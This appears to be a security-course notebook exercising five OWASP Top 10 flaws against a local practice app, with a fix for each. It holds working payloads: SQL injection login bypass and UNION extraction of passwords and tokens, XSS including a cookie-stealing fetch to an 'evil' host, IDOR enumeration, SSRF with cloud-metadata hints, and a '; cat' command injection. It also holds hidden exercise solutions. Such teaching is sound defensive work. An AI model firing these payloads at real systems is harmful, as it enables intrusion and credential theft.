# ---
# jupyter:
#   jupytext:
#     formats: ipynb,py:percent
#     text_representation:
#       extension: .py
#       format_name: percent
#       format_version: '1.3'
#       jupytext_version: 1.19.3
#   kernelspec:
#     display_name: Python 3
#     language: python
#     name: python3
# ---

# %% [markdown]
# # Module 23 — Web Application Security (OWASP Top 10)
#
# **Purpose:** Web apps are where most real-world breaches happen. The
# [OWASP Top 10](https://owasp.org/www-project-top-ten/) is the industry's canonical
# list of the most critical web risks. In this module you **exploit** five of them on
# the bundled `vulnlab` app, understand the **root cause**, then see the **fix** — the
# attack→understand→defend loop at the heart of this track.
#
# **Prerequisites:** Modules 17 and 21–22 (HTTP APIs, recon).
#
# > ♻️ **Ethics reminder (Module 21):** the target is `vulnlab`, an app *you run on
# > localhost*. These exact techniques against someone else's site are illegal.
#
# **What you'll learn (mapped to OWASP Top 10 2021):**
# - **A03 Injection** — SQL injection (auth bypass + UNION exfiltration)
# - **A03 Injection** — reflected & stored Cross-Site Scripting (XSS)
# - **A01 Broken Access Control** — IDOR
# - **A10 SSRF** — Server-Side Request Forgery
# - **A03 Injection** — OS command injection
#
# This is the same workflow as PortSwigger's Web Security Academy, but against a target
# you fully control.

# %%
# vulnlab lives next to this notebook. Run it in-process via TestClient so nothing
# leaves the machine (no separate `uvicorn` needed for the lesson).
from fastapi.testclient import TestClient
from vulnlab.main import app

client = TestClient(app)
client.__enter__()  # startup: seeds a fresh DB
print("vulnlab up (in-process). Health:", client.get("/health").json()["status"])

# %% [markdown]
# ## A03 — SQL Injection (1): authentication bypass
#
# vulnlab builds its login query by **string concatenation**:
# ```python
# "SELECT ... FROM users WHERE username = '{username}' AND password = '{password}'"
# ```
# If we send a password of `' OR '1'='1`, the `WHERE` clause becomes always-true and we
# log in as the first matching user — **without knowing the password**.

# %%
# Normal login (works, but we need the password):
ok = client.post("/login", json={"username": "alice", "password": "hunter2"})
print("Legit login:", ok.json())

# Injection: password breaks out of the quotes and neutralizes the check.
payload = {"username": "alice", "password": "anything' OR '1'='1"}
attack = client.post("/login", json=payload)
print("SQLi bypass:", attack.json(), "<-- logged in as admin, no password!")

# %% [markdown]
# **Root cause:** user input is treated as **code**, not **data**.
# **Fix:** *parameterized queries* (a.k.a. prepared statements) — the driver sends the
# query and the values separately, so input can never change the query's structure:
# ```python
# cur.execute("SELECT ... WHERE username = ? AND password = ?", (username, password))
# ```
# (Plus: never store plaintext passwords — bcrypt them, Module 24.)

# %% [markdown]
# ## A03 — SQL Injection (2): UNION-based data exfiltration
#
# `/search` interpolates `q` into `... WHERE title LIKE '%{q}%'`. A `UNION SELECT` welds
# a *second* query onto the first, letting us pull rows from **other tables** (the
# `users` table, including plaintext passwords) into the notes results.
#
# The column **count and order must match** the original `SELECT id, owner, title`.

# %%
exfil = "zzz%' UNION SELECT id, username, password FROM users -- "
resp = client.get("/search", params={"q": exfil})
print("Executed query:\n ", resp.json()["query"], "\n")
print("Leaked credentials (owner=username, title=password):")
for row in resp.json()["results"]:
    print(f"  user={row['owner']:8} password={row['title']}")

# %% [markdown]
# ### Exercise 1 — Exfiltrate the secret API tokens
#
# **Purpose:** Prove you can pivot a UNION injection to *any* column. The `users` table
# also has an `api_token` column — those tokens are the real prize (they grant API
# access without a password).
#
# Build a `q` payload that returns each user's **username** and **api_token** via the
# `/search` endpoint, and print them.

# %%
# TODO: craft a UNION payload that selects (id, username, api_token) from users.
# Send it to /search and print owner + the leaked token.
my_payload = "..."  # your code here


# %% jupyter={"source_hidden": true} tags=["solution"]
# SOLUTION
my_payload = "zzz%' UNION SELECT id, username, api_token FROM users -- "
res = client.get("/search", params={"q": my_payload}).json()["results"]
print("Leaked API tokens:")
for row in res:
    print(f"  {row['owner']:8} -> {row['title']}")

# %% [markdown]
# ## A01 — Broken Access Control (IDOR)
#
# **IDOR** = Insecure Direct Object Reference: the app exposes a database key (here a
# sequential note id) and **fails to check that the requester is allowed to see it**.
# Note id 2 is alice's *private* admin note — but anyone can read it just by asking.

# %%
# Enumerate notes by id — no auth, no ownership check. Private notes leak.
for note_id in range(1, 6):
    n = client.get(f"/notes/{note_id}").json()
    flag = "  <-- PRIVATE!" if n.get("private") else ""
    print(f"id={note_id} owner={n['owner']:6} title={n['title']!r}{flag}")

# %% [markdown]
# **Root cause:** authorization is missing — the server trusts the id in the URL.
# **Fix:** on every object access, check ownership/role server-side
# (`if note.owner != current_user: 403`). Sequential ids aren't the bug, but using
# unguessable UUIDs adds defence-in-depth.

# %% [markdown]
# ## A03 — Cross-Site Scripting (XSS)
#
# XSS = the app reflects attacker input into a page **without escaping it**, so the
# browser runs it as code. **Reflected** XSS bounces off one request; **stored** XSS is
# saved server-side and fires for *every* later visitor (worse).

# %%
# Reflected: our <script> comes straight back inside the HTML.
r = client.get("/greet", params={"name": "<script>alert(document.cookie)</script>"})
print("Reflected XSS — server returned our script verbatim:")
print(" ", r.text)

# Stored: post a comment with a script, then load the comments page.
client.post("/comments", json={"author": "mallory",
                               "body": "<script>fetch('//evil/'+document.cookie)</script>"})
page = client.get("/comments")
print("\nStored XSS present in /comments page:",
      "<script>fetch('//evil/" in page.text)

# %% [markdown]
# **Root cause:** output is not **context-encoded**. **Fix:** HTML-escape all
# untrusted output (`html.escape`, or a templating engine with autoescaping like
# Jinja2), set a **Content-Security-Policy** header, and mark cookies `HttpOnly` so JS
# can't read them.

# %% [markdown]
# ### Exercise 2 — Prove the fix stops reflected XSS
#
# **Purpose:** Defence is the other half of the job. Show that proper output encoding
# neutralizes the payload while keeping the page functional.
#
# Write `safe_greet(name)` that returns the same HTML as `/greet` but HTML-escapes
# `name`. Confirm the `<script>` payload comes out inert (as `&lt;script&gt;`).

# %%
import html

# TODO: Implement safe_greet(name: str) -> str using html.escape on `name`.
def safe_greet(name: str) -> str:
    ...  # your code here


# %% jupyter={"source_hidden": true} tags=["solution"]
# SOLUTION
def safe_greet(name: str) -> str:
    return f"<html><body><h1>Hello, {html.escape(name)}!</h1></body></html>"


evil = "<script>alert(1)</script>"
out = safe_greet(evil)
print("Encoded output:", out)
print("Script neutralized:", "<script>" not in out and "&lt;script&gt;" in out)

# %% [markdown]
# ## A10 — Server-Side Request Forgery (SSRF)
#
# `/fetch?url=` makes the **server** request a URL you supply. On a real network this is
# dangerous: the server can reach **internal-only** hosts you cannot — cloud metadata
# endpoints (`http://169.254.169.254/`, which leak cloud credentials), admin panels on
# `localhost`, databases behind the firewall.
#
# We stand up a throwaway "internal-only" service, then make vulnlab fetch it —
# proving the server will request whatever URL we point it at.

# %%
import http.server, socketserver, threading

class _Internal(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"INTERNAL-SECRET: db_password=s3cr3t")
    def log_message(self, *a):  # silence
        pass

_httpd = socketserver.TCPServer(("127.0.0.1", 0), _Internal)
_internal_port = _httpd.server_address[1]
threading.Thread(target=_httpd.serve_forever, daemon=True).start()

# The attacker can't reach this directly in a real network — but the server can:
ssrf = client.get("/fetch", params={"url": f"http://127.0.0.1:{_internal_port}/"})
print("SSRF preview (server fetched an internal-only service for us):")
print(" ", ssrf.json()["preview"])
_httpd.shutdown()
print("\nOn a cloud box, url=http://169.254.169.254/latest/meta-data/ would leak IAM creds.")

# %% [markdown]
# **Root cause:** the server trusts a user-supplied URL with no restrictions.
# **Fix:** an **allow-list** of permitted hosts/schemes, block private/link-local IP
# ranges (RFC 1918, 169.254.0.0/16), disable redirects, and never reflect raw responses.

# %% [markdown]
# ## A03 — OS Command Injection
#
# `/ping` builds a shell command from your input: `ping -c 1 {host}`. Shell metacharacters
# (`;`, `&&`, `|`, backticks) let you append **arbitrary commands**.

# %%
ci = client.post("/ping", json={"host": "127.0.0.1; echo INJECTED-COMMAND-RAN"})
print("Command output (note our injected echo executed):")
print(ci.json()["stdout"].strip().splitlines()[-1])

# %% [markdown]
# ### Exercise 3 — Read a file via command injection
#
# **Purpose:** Command injection usually escalates fast. Show that you can run *any*
# command, not just `echo` — exfiltrate the contents of a file.
#
# Send a `/ping` payload that also runs `cat` (or `type` on Windows) on a file you
# create first, and confirm the file's contents appear in the response.

# %%
import tempfile, os

secret_file = os.path.join(tempfile.gettempdir(), "vulnlab_secret.txt")
with open(secret_file, "w") as f:
    f.write("TOP-SECRET-LAB-CONTENTS")

# TODO: craft a host value that appends `; cat <secret_file>` and send it to /ping.
# Print the response stdout and confirm "TOP-SECRET-LAB-CONTENTS" is in it.
ci_payload = "..."  # your code here


# %% jupyter={"source_hidden": true} tags=["solution"]
# SOLUTION
ci_payload = f"127.0.0.1; cat {secret_file}"
out = client.post("/ping", json={"host": ci_payload}).json()["stdout"]
print("Exfiltrated file via command injection:")
print("  contains secret:", "TOP-SECRET-LAB-CONTENTS" in out)

# %% [markdown]
# **Root cause:** untrusted input reaches a **shell**. **Fix:** never use `shell=True`
# with user input. Pass an **argument list** so there is no shell to inject into:
# ```python
# subprocess.run(["ping", "-c", "1", host])  # host can't add commands
# ```
# and validate `host` against an IP/hostname allow-list.

# %%
client.__exit__(None, None, None)  # clean shutdown

# %% [markdown]
# ## What you learned
#
# | OWASP | Vuln | Root cause | Fix |
# |-------|------|------------|-----|
# | A03 | SQL injection | input parsed as SQL code | parameterized queries |
# | A03 | XSS (reflected/stored) | unescaped output | context encoding + CSP |
# | A01 | IDOR | missing authz check | verify ownership server-side |
# | A10 | SSRF | unrestricted server fetch | host allow-list, block private IPs |
# | A03 | Command injection | input reaches a shell | arg-list `subprocess`, no `shell=True` |
#
# The through-line: **never mix untrusted data into a command/query/markup language
# without separating data from code.**
#
# ## Further reading
#
# - **OWASP Top 10 (2021)**: https://owasp.org/www-project-top-ten/
# - **PortSwigger Web Security Academy** (free interactive labs for every flaw above):
#   https://portswigger.net/web-security
# - **OWASP Cheat Sheets** — SQLi Prevention, XSS Prevention, SSRF Prevention, Access
#   Control: https://cheatsheetseries.owasp.org/
# - **OWASP Web Security Testing Guide (WSTG)**:
#   https://owasp.org/www-project-web-security-testing-guide/
# - **Burp Suite** (the standard intercepting proxy for manual web testing):
#   https://portswigger.net/burp
#
# **Next:** [Module 24 — Auth Attacks & Defense →](../24_auth_attacks_and_defense/) —
# break vulnlab's login by brute force, then build the defences that stop you.
